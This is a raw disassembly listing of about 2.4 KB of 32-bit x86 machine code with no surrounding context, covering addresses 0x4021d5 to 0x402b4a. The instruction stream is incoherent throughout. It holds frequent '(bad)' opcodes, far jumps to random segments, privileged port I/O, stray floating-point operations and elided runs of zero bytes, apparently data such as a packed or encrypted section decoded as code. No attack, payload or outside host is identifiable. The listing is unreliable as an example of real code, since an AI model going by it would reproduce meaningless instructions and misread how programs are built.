  4021d5:	jmp    0xe0e9:0x585f856
  4021dc:	daa    
  4021dd:	(bad)  
  4021df:	push   0xffffffb5
  4021e1:	add    eax,0x10b58ce9
  4021e6:	test   eax,0x4487f656
  4021eb:	cld    
	...
  4021fc:	add    BYTE PTR [eax],al
  4021fe:	sti    
  4021ff:	push   edi
  402200:	xlat   BYTE PTR ds:[ebx]
  402201:	mov    WORD PTR [edi],?
  402203:	std    
  402204:	sub    BYTE PTR [edi*2-0x101f2aae],dh
  40220b:	hlt    
  40220c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40220d:	push   esi
  40220e:	(bad)  
  40220f:	fist   DWORD PTR [esp+ecx*1]
  402212:	push   edx
  402213:	es xchg esi,eax
  402215:	loopne 0x402274
  402217:	cmp    al,0xa0
  402219:	(bad)
  40221c:	sbb    al,0x8d
  40221e:	pop    esi
  40221f:	xchg   ah,bh
  402221:	or     edi,ebx
  402223:	add    al,0xe9
  402225:	add    edi,0xd
  402228:	outs   dx,BYTE PTR ds:[esi]
  402229:	push   ss
  40222a:	cmc    
  40222b:	sub    eax,0x427d03a8
  402230:	icebp  
  402231:	ins    DWORD PTR es:[edi],dx
  402232:	cli    
  402233:	fcmovnu st,st(4)
  402235:	neg    DWORD PTR [edx+edx*2]
  402238:	stc    
  402239:	loopne 0x4021ca
  40223b:	or     BYTE PTR [esi+0x56],al
  40223e:	add    ch,ch
  402240:	xor    eax,0x20dc05e1
  402245:	(bad)
  402248:	add    al,ah
  40224a:	xor    DWORD PTR [eax+edi*1-0x16f24c1b],0x3b5fa03
  402255:	push   esp
  402256:	out    dx,al
  402257:	test   DWORD PTR [ebx],ebx
  402259:	adc    ch,BYTE PTR [eax-0x53]
  40225c:	add    eax,0xd7f5c882
  402261:	repnz add BYTE PTR [eax],al
	...
  402274:	jmp    0x84f0:0x700700e6
  40227b:	test   eax,0xe7004618
  402280:	mov    dh,0x51
  402282:	fisubr DWORD PTR [edx+0x3eec8fe3]
  402288:	jno    0x4022cb
  40228a:	or     dh,dl
  40228c:	dec    esi
  40228d:	(bad)  
  40228e:	jge    0x402285
  402290:	or     BYTE PTR [ecx+0x10],0xf2
  402294:	mov    dh,0x50
  402296:	sbb    BYTE PTR [edx+0x46],ah
  402299:	(bad)
  40229c:	or     eax,DWORD PTR [eiz*1+0x4f6a6]
  4022a3:	jb     0x402297
  4022a5:	add    DWORD PTR [eax+0x8],0xab3304b7
  4022ac:	mov    ebp,0x867ee8e6
  4022b1:	cmp    ecx,ecx
  4022b3:	stos   DWORD PTR es:[edi],eax
  4022b4:	jmp    0x8337:0x4a625504
  4022bb:	in     al,dx
  4022bc:	add    DWORD PTR ds:0x4134ee75,eax
  4022c2:	or     BYTE PTR [ebx+0x6a0045d6],bl
  4022c8:	fwait
  4022c9:	or     BYTE PTR [eax],al
  4022cb:	aam    0xfc
  4022cd:	ret    
  4022ce:	inc    ebp
  4022cf:	cmc    
  4022d0:	imul   ebp,DWORD PTR [ecx+eax*2],0xffffffe9
  4022d4:	and    al,0x51
  4022d6:	or     BYTE PTR [ecx+0x0],al
	...
  4022e9:	add    ch,bl
  4022eb:	leave  
  4022ec:	add    cl,ch
  4022ee:	cmp    BYTE PTR [ebp-0x13026301],0x35
  4022f5:	sub    al,0xfe
  4022f7:	add    al,0x3
  4022f9:	xor    DWORD PTR [ecx],edi
  4022fb:	ss call 0x1ad8cf
  402301:	add    BYTE PTR [eax-0x67],cl
  402304:	push   DWORD PTR [ebp-0x35]
  402307:	pop    ss
  402308:	call   0x41394c
  40230d:	jmp    FWORD PTR [esi]
  40230f:	or     dl,BYTE PTR [ebx-0x18]
  402312:	xlat   BYTE PTR ds:[ebx]
  402313:	mov    bl,0x0
  402315:	add    BYTE PTR [eax],ch
  402317:	(bad)  
  402318:	pop    ebx
  402319:	leave  
  40231a:	push   ecx
  40231b:	push   cs
  40231c:	add    BYTE PTR [ebp+0x18],dl
  40231f:	jmp    0x7500:0x9368353
  402326:	pushf  
  402327:	ret    
  402328:	inc    ebp
  402329:	or     BYTE PTR [ecx],al
  40232b:	cs inc ecx
  40232d:	add    al,ah
  40232f:	fs or  al,0x0
  402332:	push   cs
  402333:	add    al,bh
  402335:	inc    ebp
  402336:	push   edi
  402337:	je     0x402361
  402339:	inc    ecx
  40233a:	push   ebx
  40233b:	mov    ebx,0xef7b0875
  402340:	int3   
  402341:	add    BYTE PTR [ebx-0x71],ah
  402344:	fdivr  st,st(7)
  402346:	dec    esi
  402347:	or     ch,al
  402349:	loope  0x4022e2
  40234b:	push   es
  40234c:	add    BYTE PTR [ebx],al
	...
  40235e:	add    BYTE PTR [eax],al
  402360:	mov    eax,DWORD PTR [edi+0x53]
  402363:	call   0x3fe230
  402368:	test   al,0x9d
  40236a:	push   DWORD PTR [ebp+0x1b]
  40236d:	pop    ss
  40236e:	call   0x461b5e
  402373:	dec    DWORD PTR [esi+0xa]
  402376:	push   ebx
  402377:	call   0x40ed27
  40237c:	les    edi,FWORD PTR [eax+ecx*1]
  40237f:	call   0x3fe2ef
  402384:	push   0x11c95bc7
  402389:	push   cs
  40238a:	add    BYTE PTR [ebp-0x6],dl
  40238d:	out    dx,ax
  40238f:	cmp    DWORD PTR [esi-0x897c9f9],0xffffffec
  402396:	add    eax,DWORD PTR [eax]
  402398:	rcl    BYTE PTR [edx],cl
  40239a:	(bad)  
  40239c:	mov    ebp,0x79fc4864
  4023a1:	test   al,0x64
  4023a3:	sub    DWORD PTR [ebx],edi
  4023a5:	in     al,dx
  4023a6:	add    esi,DWORD PTR [ebp-0x8]
  4023a9:	mov    dh,0xf6
  4023ab:	(bad)  
  4023ac:	daa    
  4023ad:	mov    al,0x6a
  4023af:	add    BYTE PTR [eax],ah
  4023b1:	in     al,dx
  4023b2:	fdiv   QWORD PTR [ebp+0x2]
  4023b5:	ss add al,0xff
  4023b8:	out    dx,eax
  4023b9:	dec    esp
  4023ba:	sub    eax,DWORD PTR [ecx-0x6]
  4023bd:	push   0xaac279c4
  4023c2:	push   edi
  4023c3:	cld    
	...
  4023d4:	add    BYTE PTR [eax],al
  4023d6:	(bad)  
  4023d7:	neg    eax
  4023d9:	jmp    DWORD PTR [ebp-0x5e]
  4023dc:	inc    edi
  4023dd:	cld    
  4023de:	cli    
  4023df:	jmp    0x4023e4
  4023e1:	add    BYTE PTR [ebp-0x5bed500],dl
  4023e7:	jbe    0x402418
  4023e9:	mov    ebp,ebp
  4023eb:	push   esi
  4023ec:	inc    edi
  4023ed:	or     BYTE PTR [edi],dl
  4023ef:	push   ebx
  4023f0:	pop    ebp
  4023f1:	push   DWORD PTR ds:0xa7044194
  4023f7:	push   es
  4023f8:	push   0x0
  4023fa:	ja     0x4023a9
  4023fc:	or     edx,DWORD PTR [eax-0x6e]
  4023ff:	jl     0x40242b
  402401:	inc    ecx
  402402:	cli    
  402403:	dec    edx
  402404:	adc    ch,al
  402406:	scas   eax,DWORD PTR es:[edi]
  402407:	inc    ecx
  402408:	(bad)  
  40240a:	icebp  
  40240b:	sub    ebx,DWORD PTR [eax+0x5]
  40240e:	jae    0x4023b8
  402410:	fucomip st,st(3)
  402412:	add    ch,BYTE PTR [ebx-0x3b]
  402415:	add    al,0x79
  402417:	add    eax,0xc76f03e6
  40241c:	jb     0x402465
  40241e:	fidivr WORD PTR [eax]
  402420:	and    dl,al
  402422:	inc    BYTE PTR [esp+esi*4]
  402425:	mov    dh,bl
  402427:	xor    al,0x72
  402429:	inc    edi
  40242a:	repnz or ebp,DWORD PTR [ecx]
  40242d:	pop    eax
  40242e:	test   DWORD PTR [ecx+esi*4+0x310b2f03],0xe904fa04
  402439:	cmp    BYTE PTR [eax],al
	...
  40244b:	add    BYTE PTR [ebx+0x1003e5c3],dh
  402451:	add    eax,0x4200443
  402456:	inc    ebx
  402457:	add    al,0x20
  402459:	add    eax,0x4fa8451
  40245e:	jmp    0xc14d2c3f
  402463:	in     al,0x41
  402465:	add    eax,0x2c5288e9
  40246a:	test   eax,0x3a0bee40
  40246f:	in     al,dx
  402470:	push   esp
  402471:	int3   
  402472:	jmp    0xe946b67a
  402477:	add    edi,edx
  402479:	cmp    esi,DWORD PTR [eax+0x1404fec1]
  40247f:	mov    DWORD PTR [esi-0x74],ecx
  402482:	sub    al,0xc
  402484:	add    ebp,eax
  402486:	cmc    
  402487:	push   es
  402488:	jp     0x4024a7
  40248a:	jmp    0xe9dd17e5
  40248f:	add    edi,edx
  402491:	add    al,0x20
  402493:	sar    esi,0x4
  402496:	dec    esi
  402497:	push   esi
  402498:	add    ch,ch
  40249a:	cmp    ecx,eax
  40249c:	cli    
  40249d:	add    al,0x6a
  40249f:	(bad)  
  4024a1:	push   eax
  4024a2:	add    ah,ah
  4024a4:	mov    al,ds:0xf9e8fff4
  4024a9:	pop    es
  4024aa:	xchg   ebp,eax
  4024ab:	sub    esi,esi
  4024ad:	mov    es,eax
  4024af:	adc    al,BYTE PTR [eax]
	...
  4024c1:	add    ah,dh
  4024c3:	pushf  
  4024c4:	add    cl,ch
  4024c6:	stc    
  4024c7:	add    al,0xc9
  4024c9:	sub    esi,ebp
  4024cb:	add    al,0x55
  4024cd:	jb     0x4024a4
  4024cf:	add    esp,0xfffffffd
  4024d2:	push   edx
  4024d3:	add    eax,0x51d6e96a
  4024d8:	or     BYTE PTR [ecx],al
  4024da:	ret    0xcb
  4024dd:	jmp    0x13b4e9d6
  4024e2:	out    0x34,al
  4024e4:	call   0x17d973
  4024e9:	pusha  
  4024ea:	cmp    ebx,ecx
  4024ec:	pop    eax
  4024ed:	sbb    DWORD PTR [ecx+0x2bbefc51],esp
  4024f3:	or     eax,0x44579e8
  4024f8:	add    dl,ah
  4024fa:	cmp    DWORD PTR [ecx+0xc],edx
  4024fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024fe:	retf   
  4024ff:	fsubr  st,st(0)
  402501:	sbb    DWORD PTR [edi+edx*8],edi
  402504:	inc    edx
  402506:	cmp    ebx,ebp
  402508:	add    esp,DWORD PTR [edx-0x45]
  40250b:	fmul   st,st(1)
  40250d:	stos   DWORD PTR es:[edi],eax
  40250e:	cli    
  40250f:	add    al,0x55
  402511:	jb     0x402565
  402513:	xor    ecx,DWORD PTR [ebx+0x106b0214]
  402519:	sbb    bl,BYTE PTR [esi]
  40251b:	cmp    dl,0x66
  40251e:	inc    ecx
  40251f:	push   0x0
  402521:	sar    ecx,cl
  402523:	push   0x3
  402525:	ret    
	...
  402536:	add    BYTE PTR [eax],al
  402538:	stc    
  402539:	push   0x3
  40253b:	sar    ecx,0x4
  40253e:	add    BYTE PTR [eax],al
  402540:	xchg   ebx,eax
  402541:	mov    ebx,0x27ab0875
  402546:	retf   
  402547:	add    bl,ah
  402549:	mov    DWORD PTR [ebx],eax
  40254b:	inc    eax
  40254c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40254d:	push   cs
  40254e:	push   0x0
  402550:	mov    ds:0xd3cb6cea,eax
  402555:	add    cl,BYTE PTR [ecx+0x68df43]
  40255b:	push   0xffffffe3
  40255d:	push   0x68d16a00
  402562:	add    bh,bh
  402564:	sub    dl,0x5e
  402567:	retf   
  402568:	mov    ds:0x27c00b02,eax
  40256d:	sub    ecx,DWORD PTR [ecx+0x689743]
  402573:	push   0xffffff93
  402575:	push   0x12a76a00
  40257a:	call   0x427dce
  40257f:	mov    eax,edx
  402581:	or     BYTE PTR [ebx],cl
  402583:	rol    dh,0x24
  402586:	push   DWORD PTR [ebx+0x67]
  402589:	jmp    0x33ff:0x263caf2
  402590:	mov    esp,edi
  402592:	retf   0x5300
  402595:	ret    
  402596:	add    edi,edi
  402598:	ins    BYTE PTR es:[edi],dx
  402599:	mov    ebx,0xebff
	...
  4025ae:	cs mov ebx,0xc89fe833
  4025b4:	add    BYTE PTR [eax],al
  4025b6:	xchg   esp,eax
  4025b7:	(bad)  
  4025b8:	(bad)  
  4025b9:	jmp    FWORD PTR [edx+edi*4+0x3f6ac02b]
  4025c0:	or     BYTE PTR [edi],cl
  4025c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025c3:	rcr    DWORD PTR [ebx-0x37],0xd1
  4025c7:	or     DWORD PTR [eax],eax
  4025c9:	push   ebp
  4025ca:	cli    
  4025cb:	(bad)  
  4025cc:	out    0x53,eax
  4025ce:	sub    DWORD PTR [ecx+0x3ec1830b],0x9afd174f
  4025d8:	or     ebp,eax
  4025da:	add    esp,DWORD PTR [ebx]
  4025dc:	add    eax,DWORD PTR [eax]
  4025de:	in     eax,dx
  4025df:	call   0x3:0x1197e7ff
  4025e6:	fnstsw WORD PTR [edx-0x143f5915]
  4025ec:	add    ebx,DWORD PTR [ebx-0x3d]
  4025ef:	sub    edi,edi
  4025f1:	jmp    FWORD PTR [esi]
  4025f3:	push   ebx
  4025f4:	out    0x81,eax
  4025f6:	mov    dh,0xb
  4025f8:	jmp    0xef83:0x3275b5ff
  4025ff:	jae    0x40262c
  402601:	inc    ecx
  402602:	cli    
  402603:	jmp    0x402654
  402605:	adc    eax,0x283bf09d
  40260a:	cmp    ebp,esp
  40260c:	jmp    0x402598
  40260e:	xchg   ebx,eax
  40260f:	(bad)  
  402610:	fld    st(7)
	...
  402622:	add    BYTE PTR [eax],al
  402624:	jmp    DWORD PTR [ebx]
  402626:	sub    al,0x41
  402628:	cli    
  402629:	jmp    0x40262e
  40262b:	add    dl,bh
  40262d:	push   0x17
  40262f:	pop    esp
  402630:	and    ch,BYTE PTR ds:0xd8ee0004
  402636:	fdiv   DWORD PTR ds:0x42b3be
  40263c:	(bad)  
  40263d:	(bad)  
  40263e:	(bad)  
  402640:	dec    ebp
  402641:	sahf   
  402642:	call   FWORD PTR [ebx+0x12]
  402645:	sub    eax,0xebfa0004
  40264a:	add    ecx,DWORD PTR [ebp-0x16a481]
  402650:	sub    eax,0x2aa6ebfb
  402655:	add    al,0x66
  402657:	fldcw  WORD PTR [edi+0x7f]
  40265a:	dec    ebp
  40265b:	jmp    0xebf9fb75
  402660:	jo     0x402636
  402662:	dec    esi
  402663:	fnstenv [edi+0x3f]
  402666:	inc    ebp
  402667:	xor    al,0x92
  402669:	adc    DWORD PTR fs:[ebx-0x6],eax
  40266d:	pop    esp
  40266e:	jmp    0x402673
  402670:	cli    
  402671:	test   BYTE PTR [ecx+0x71],al
  402674:	mov    cl,0x5
  402676:	jmp    0x6444e087
  40267b:	cmp    eax,0xc0e904fb
  402680:	ja     0x40265b
  402682:	(bad)  
  402683:	fadd   st,st(5)
  402685:	add    eax,0x3e9
	...
  40269a:	cli    
  40269b:	retf   
  40269c:	fsub   QWORD PTR fs:[ebp-0x227092c]
  4026a3:	add    al,0xe9
  4026a5:	ins    DWORD PTR es:[edi],dx
  4026a6:	cli    
  4026a7:	pop    esi
  4026a8:	jmp    0xe99f211a
  4026ad:	xchg   BYTE PTR [edi-0x33],bh
  4026b0:	(bad)  
  4026b1:	fmul   DWORD PTR [ebp-0x7981a3cb]
  4026b7:	in     al,0xc6
  4026b9:	fsubr  DWORD PTR [edx]
  4026bb:	aam    0x74
  4026bd:	iret   
  4026be:	gs aam 0xb6
  4026c1:	fsub   st,st(7)
  4026c3:	rol    cl,1
  4026c5:	xor    DWORD PTR ss:0x43a0ce9,eax
  4026cc:	fs hlt 
  4026ce:	cli    
  4026cf:	add    al,0xe9
  4026d1:	imul   ecx,DWORD PTR [edx-0x2dfbd7e3],0x64
  4026d8:	rol    DWORD PTR [edx-0x6],1
  4026db:	fdiv   st(6),st
  4026dd:	xlat   BYTE PTR ds:[ebx]
  4026de:	xor    eax,0x39e200d4
  4026e3:	add    al,0x84
  4026e5:	js     0x4026e0
  4026e7:	add    al,0x0
  4026e9:	jb     0x402754
  4026eb:	add    BYTE PTR [ebp-0x2bdda3],0xb9
  4026f2:	(bad)  
  4026f3:	fdivr  QWORD PTR [ebp+ecx*2+0x290bd422]
  4026fa:	repnz mov dl,bl
  4026fd:	jmp    0x402702
	...
  40270e:	add    BYTE PTR [eax],al
  402710:	stc    
  402711:	add    al,0x89
  402713:	ins    BYTE PTR es:[edi],dx
  402714:	(bad)  
  402716:	jmp    FWORD PTR [esi]
  402718:	jl     0x4026a3
  40271a:	call   0x5113e935
  40271f:	xchg   ecx,eax
  402720:	gs sbb eax,0x99b2e941
  402726:	loopne 0x402726
  402728:	lods   eax,DWORD PTR ds:[esi]
  402729:	shr    DWORD PTR [eax-0x15],cl
  40272c:	stc    
  40272d:	add    al,0x80
  40272f:	adc    DWORD PTR [edx+0x1f6ffcf],ecx
  402735:	lds    ecx,FWORD PTR [edi]
  402737:	test   BYTE PTR gs:[eax+eax*1],al
  40273b:	jmp    0xee41f3b8
  402740:	pop    ss
  402741:	jno    0x402743
  402743:	jmp    0x953f5c41
  402748:	xchg   esi,eax
  402749:	jecxz  0x40274a
  40274b:	mov    dh,0xd3
  40274e:	mov    ch,0xb9
  402750:	pop    ebp
  402751:	sar    edi,cl
  402753:	shr    DWORD PTR [edi-0x28],0xff
  402757:	scas   al,BYTE PTR es:[edi]
  402758:	jae    0x4026e3
  40275a:	call   0x51136cf5
  40275f:	adc    DWORD PTR [edx+0x24e9411c],ebx
  402765:	cdq    
  402766:	loopne 0x4027e6
  402768:	sub    eax,0x510068d3
  40276d:	pop    es
  40276e:	add    BYTE PTR [eax-0x4bc75],al
	...
  402784:	add    BYTE PTR [eax],al
  402786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402787:	(bad)  
  402788:	mov    edi,0xbd87df74
  40278d:	call   0x23fe356
  402792:	sub    eax,0x96504fee
  402797:	test   esp,edi
  402799:	out    dx,eax
  40279a:	mov    ah,0xbb
  40279c:	push   eax
  40279d:	call   0x40e7ed
  4027a2:	xchg   ebx,eax
  4027a3:	jge    0x40272a
  4027a5:	cld    
  4027a6:	xor    al,0xba
  4027a8:	call   DWORD PTR [eax+0x14]
  4027ab:	je     0x402799
  4027ad:	out    dx,eax
  4027ae:	adc    al,0xba
  4027b0:	call   0xfffa1784
  4027b5:	pop    eax
  4027b6:	in     al,0x73
  4027b8:	call   0x50fa1cac
  4027bd:	(bad)  
  4027be:	(bad)  
  4027bf:	fsub   st(7),st
  4027c1:	push   DWORD PTR [esi+ebx*8-0x445b0b44]
  4027c8:	call   0xfffbd2e6
  4027cd:	jmp    0x4027c2
  4027cf:	jnp    0x402756
  4027d1:	cld    
  4027d2:	les    edi,FWORD PTR [ebx+0xbbb50ff]
  4027d8:	leave  
  4027d9:	add    BYTE PTR [ebx+0xe8d5046],dl
  4027df:	mov    edx,0x16b4ffef
  4027e4:	push   DWORD PTR [ebp-0x14c9]
	...
  4027fa:	add    BYTE PTR [eax],al
  4027fc:	cmp    edx,DWORD PTR [ebp-0xc]
  4027ff:	call   DWORD PTR [esi+ebx*8-0x448b080e]
  402806:	push   DWORD PTR [ebp-0x198406]
  40280c:	inc    ebp
  40280d:	test   dh,bl
  40280f:	idiv   DWORD PTR ds:0x2e85d68b
  402815:	adc    esi,0xffffffff
  402818:	and    edx,DWORD PTR [ebx]
  40281a:	aad    0xff
  40281c:	and    eax,0x12fc5063
  402821:	cli    
  402822:	leave  
  402823:	add    dl,bh
  402825:	mov    ch,0x3
  402827:	inc    DWORD PTR [edi+0x2c]
  40282a:	out    0xff,al
  40282c:	add    eax,0xfdf43344
  402831:	dec    edx
  402832:	imul   eax,DWORD PTR [eax],0xefe758f5
  402838:	in     eax,dx
  402839:	sbb    ch,bl
  40283b:	inc    ebx
  40283c:	out    dx,al
  40283d:	and    dl,dh
  40283f:	lea    esi,[edi-0x1]
  402842:	in     eax,0xff
  402844:	aad    0x8b
  402846:	(bad)  
  402847:	mov    ch,0xca
  402849:	or     dl,dh
  40284b:	call   edx
  40284d:	or     eax,0x60fa00cc
  402852:	ret    
  402853:	js     0x402896
  402855:	ror    DWORD PTR [edi-0x2a256210],cl
  40285b:	call   0x15fba5
	...
  402870:	add    BYTE PTR [eax],al
  402872:	jae    0x4028d4
  402874:	in     al,dx
  402875:	out    dx,eax
  402876:	xchg   ebp,eax
  402877:	mov    dl,0xd5
  402879:	mov    ch,0xa2
  40287b:	retf   0xffd5
  40287e:	xchg   edx,eax
  40287f:	(bad)  
  402880:	int    0xff
  402882:	jge    0x402902
  402884:	cmp    al,0x28
  402886:	mov    ebx,0x56b5d4db
  40288b:	retf   0xffd5
  40288e:	push   edx
  40288f:	pop    ebp
  402890:	int3   
  402891:	add    dl,bh
  402893:	add    al,0xf2
  402895:	ret    
  402896:	into   
  402897:	in     eax,dx
  402898:	jno    0x402821
  40289a:	(bad)
  40289f:	aam    0x62
  4028a1:	pop    ss
  4028a2:	mov    ds:0x2904281c,al
  4028a7:	test   al,0x7e
  4028a9:	(bad)  
  4028aa:	push   ss
  4028ab:	loope  0x402923
  4028ad:	aad    0x12
  4028af:	pop    ebx
  4028b0:	mov    eax,ds:0x6c7ffa04
  4028b5:	loopne 0x4028dc
  4028b7:	rcr    DWORD PTR [esi+0x34],1
  4028ba:	or     eax,0x5e54597
  4028bf:	rol    DWORD PTR [ecx+0x53],1
  4028c2:	xor    eax,DWORD PTR [ecx+ebp*8]
  4028c5:	jle    0x402881
  4028c7:	dec    ebp
  4028c8:	mov    dl,0xd4
  4028ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028cb:	loope  0x402913
  4028cd:	aad    0xe5
  4028cf:	(bad)  [edi]
  4028d1:	out    0xdd,al
  4028d3:	shl    BYTE PTR [eax+0x7f],1
	...
  4028e6:	add    BYTE PTR [eax],al
  4028e8:	loop   0x4028ca
  4028ea:	push   ds
  4028eb:	aad    0xcd
  4028ed:	call   0x1601:0xd0c5e501
  4028f4:	(bad)
  4028f7:	mov    eax,ds:0x3a81d56
  4028fc:	lods   eax,DWORD PTR ds:[esi]
  4028fd:	call   0x2301:0xd0a5e50d
  402904:	mov    dl,0x5
  402906:	jmp    0x299e313
  40290b:	mov    DWORD PTR [edi-0x23],edi
  40290e:	(bad)  
  40290f:	aam    0x85
  402911:	jl     0x4028ec
  402913:	mov    BYTE PTR [edi-0x5bceed0],bh
  402919:	rol    DWORD PTR [ebp+0xe9a7d4],cl
  40291f:	(bad)  
  402920:	dec    esi
  402921:	shr    al,1
  402923:	loope  0x402956
  402925:	add    eax,0xd584a600
  40292a:	out    dx,eax
  40292b:	sahf   
  40292c:	fstp   QWORD PTR es:[edx-0x79]
  402930:	cs sar bh,1
  402933:	push   esp
  402934:	push   ebp
  402935:	loopne 0x402936
  402937:	xchg   BYTE PTR [ecx],ah
  402939:	inc    eax
  40293a:	out    dx,al
  40293b:	jle    0x402983
  40293d:	xor    BYTE PTR [esi-0x60],bl
  402940:	cmp    bh,BYTE PTR [edx]
  402942:	mov    edi,DWORD PTR [ebp-0x6d]
  402945:	cld    
  402946:	out    0x52,eax
  402948:	inc    edi
  402949:	sar    bh,1
  40294b:	jb     0x40294d
	...
  40295d:	add    BYTE PTR [ecx-0x30],cl
  402960:	xor    eax,0x45d19f
  402965:	pop    esi
  402966:	sti    
  402967:	iret   
  402968:	jne    0x40295b
  40296a:	jle    0x4029ae
  40296c:	add    al,0x70
  40296e:	fcomp  QWORD PTR [ecx-0x420657d8]
  402974:	ret    0xf9e5
  402977:	cmp    DWORD PTR [ebx-0x73785eb],ecx
  40297d:	mov    dh,0x8e
  40297f:	dec    ecx
  402980:	clc    
  402981:	jmp    0x6a402e7f
  402986:	and    al,0xfd
  402988:	(bad)  
  402989:	jl     0x402936
  40298b:	into   
  40298c:	jne    0x40297b
  40298e:	(bad)  
  40298f:	pop    ecx
  402990:	or     BYTE PTR [ebx-0xcf92307],al
  402996:	leave  
  402997:	iret   
  402998:	mov    DWORD PTR [edx+ebp*4],ebp
  40299b:	fild   DWORD PTR [edi]
  40299d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40299e:	inc    ebx
  40299f:	rol    DWORD PTR [eax],1
  4029a1:	jmp    0xccb2e9f
  4029a6:	pusha  
  4029a7:	sbb    al,0x41
  4029a9:	add    BYTE PTR [ebx-0x52],ah
  4029ac:	adc    ecx,DWORD PTR [ebx+0x473bb516]
  4029b2:	push   edi
  4029b3:	sub    al,0x9
  4029b5:	(bad)  
  4029b6:	push   ss
  4029b7:	rol    DWORD PTR [ecx],0x0
  4029ba:	arpl   WORD PTR [ebx],ax
  4029bc:	jmp    0x4029c4
  4029be:	enter  0xaf3,0xff
	...
  4029d2:	add    BYTE PTR [eax],al
  4029d4:	out    0xb1,al
  4029d6:	cmp    DWORD PTR [ebp+0x6b],0x8
  4029da:	jne    0x4029e4
  4029dc:	jl     0x402a0b
  4029de:	cld    
  4029df:	call   0x3fdd85
  4029e4:	cwde   
  4029e5:	cmp    eax,0xc65a5ff8
  4029ea:	or     BYTE PTR [eax],al
  4029ec:	push   esp
  4029ed:	dec    esi
  4029ee:	cmp    eax,0x49ebb6
  4029f3:	jmp    0x402a10
  4029f5:	or     cl,BYTE PTR [ebx-0x9c444c1]
  4029fb:	(bad)  
  4029fc:	cmp    al,0xce
  4029fe:	(bad)  
  4029ff:	jne    0x402a28
  402a01:	mov    edx,0x47fbb605
  402a06:	add    BYTE PTR [eax],al
  402a08:	rol    DWORD PTR [edx],cl
  402a0a:	add    BYTE PTR [edi+0x20],bl
  402a0d:	or     al,0x8b
  402a0f:	in     al,dx
  402a10:	test   BYTE PTR [edx+ebp*2],cl
  402a13:	add    ah,ch
  402a15:	sub    ecx,DWORD PTR [eax]
  402a17:	call   0x3fea30
  402a1c:	sub    cl,al
  402a1e:	push   DWORD PTR [ebp-0x55]
  402a21:	stos   BYTE PTR es:[edi],al
  402a22:	and    al,bh
  402a24:	xchg   ebx,eax
  402a25:	add    al,BYTE PTR [ebx+0xf2c92f8]
  402a2b:	push   edi
  402a2c:	and    esi,ebx
  402a2e:	and    DWORD PTR [ebp-0x75],esi
  402a31:	mov    esi,0xdcfa778d
  402a36:	jle    0x402a00
	...
  402a48:	add    BYTE PTR [eax],al
  402a4a:	mov    DWORD PTR [eax-0xae097ce],ecx
  402a50:	inc    esp
  402a51:	add    ch,al
  402a53:	mov    bl,0x6e
  402a55:	enter  0xdbfa,0xfe
  402a59:	mov    edi,0x40c9e7e6
  402a5e:	(bad)  
  402a5f:	fistp  DWORD PTR [ebp+0x5c]
  402a62:	loopne 0x402a3f
  402a64:	cmp    ch,al
  402a66:	jne    0x402a0c
  402a68:	add    eax,DWORD PTR [eax]
  402a6a:	icebp  
  402a6b:	fwait
  402a6c:	push   edi
  402a6d:	add    eax,0xeb03dc3c
  402a72:	stc    
  402a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a74:	or     al,BYTE PTR [eax]
  402a76:	int    0x83
  402a78:	mov    dl,0xc6
  402a7a:	cli    
  402a7b:	fild   DWORD PTR [esi+0x6aef9f8]
  402a81:	(bad)  
  402a82:	cmc    
  402a83:	fstp   TBYTE PTR [esi-0x39]
  402a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a87:	xchg   esi,eax
  402a88:	mov    esp,0x38dbf6c2
  402a8d:	mov    esp,esi
  402a8f:	pop    edx
  402a90:	(bad)  
  402a91:	cld    
  402a92:	sub    DWORD PTR [eax-0x5405fb01],0x444a0003
  402a9c:	shl    ebp,0xd5
  402a9f:	es jl  0x402ae7
  402aa2:	into   
  402aa3:	out    dx,al
  402aa4:	push   edi
  402aa5:	or     al,0xc5
  402aa7:	jo     0x402a78
  402aa9:	inc    DWORD PTR [edi-0x1c]
  402aac:	fcomi  st,st(4)
	...
  402abe:	add    BYTE PTR [eax],al
  402ac0:	scas   eax,DWORD PTR es:[edi]
  402ac1:	push   es
  402ac2:	sar    bh,cl
  402ac4:	daa    
  402ac5:	lods   al,BYTE PTR ds:[esi]
  402ac6:	shl    BYTE PTR [ebp-0xa],cl
  402ac9:	(bad)  
  402aca:	push   edi
  402acb:	cld    
  402acc:	xchg   edx,eax
  402acd:	arpl   WORD PTR [eax],cx
  402acf:	add    dl,bh
  402ad1:	add    al,0xe6
  402ad3:	push   edi
  402ad4:	mov    ds,esp
  402ad6:	jns    0x402aaf
  402ad8:	test   ebp,ecx
  402ada:	mov    al,ds:0x3a04eec6
  402adf:	pop    esp
  402ae0:	clc    
  402ae1:	sbb    ebp,DWORD PTR [eax]
  402ae3:	add    al,0x62
  402ae5:	mov    cl,0xa7
  402ae7:	add    al,0xfa
  402ae9:	stc    
  402aea:	test   al,0x58
  402aec:	or     BYTE PTR [edx-0x6f],bh
  402aef:	pop    esp
  402af0:	add    al,0x1c
  402af2:	sub    BYTE PTR [ecx+ebp*4],al
  402af5:	fdiv   QWORD PTR [ecx+0x4a04faca]
  402afb:	and    edx,DWORD PTR [ebx]
  402afd:	inc    esp
  402afe:	jmp    0x7277642f
  402b03:	loopne 0x402ac9
  402b05:	xor    DWORD PTR [esi],edx
  402b07:	shr    DWORD PTR [edi+0x349f80fc],1
  402b0d:	add    al,0xe9
  402b0f:	jae    0x402b12
  402b11:	(bad)
  402b14:	lods   eax,DWORD PTR ds:[esi]
  402b15:	sub    DWORD PTR [edi-0x1703c746],edi
  402b1b:	jl     0x402b9c
  402b1d:	cld    
  402b1e:	js     0x402b9d
  402b20:	shl    BYTE PTR [ebp+0x72],cl
  402b23:	push   edi
	...
  402b34:	add    BYTE PTR [eax],al
  402b36:	(bad)  
  402b37:	pop    ds
  402b38:	sub    eax,edx
  402b3a:	mov    ds:0xddd136cc,eax
  402b3f:	jne    0x402b7c
  402b41:	mov    ds:0x3e6856a,al
  402b46:	inc    esi
  402b47:	out    dx,al
  402b48:	mov    ch,0x34
  402b4a:	rol    BYTE PTR [edx-0x5fbd1],cl
